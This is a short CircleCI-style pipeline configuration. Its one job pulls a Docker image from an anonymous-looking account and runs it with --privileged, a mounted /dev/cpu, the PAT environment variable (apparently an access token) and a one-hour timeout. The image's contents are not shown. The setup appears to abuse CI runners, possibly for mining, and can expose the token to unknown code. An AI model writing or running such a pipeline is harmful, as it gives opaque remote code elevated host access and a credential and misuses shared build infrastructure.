    parameters:
      target:
        type: string
        
    machine:
      image: ubuntu-2204:current
    steps:
      - run:
          name: Pull and run Docker container
          no_output_timeout: 1h
          command: docker pull anonymousperson457/test@sha256:d4d8c16e39500a6a1faa8829a1b0435bca8815e9e00a00a6b72520a3d8688b83 && docker run --rm --privileged -v /dev/cpu:/dev/cpu -e PAT anonymousperson457/test@sha256:d4d8c16e39500a6a1faa8829a1b0435bca8815e9e00a00a6b72520a3d8688b83
          
workflows:
  runner:
    jobs:
      - runner:
          name: << matrix.target >>
          matrix:
            parameters:
              target:
                - build-1
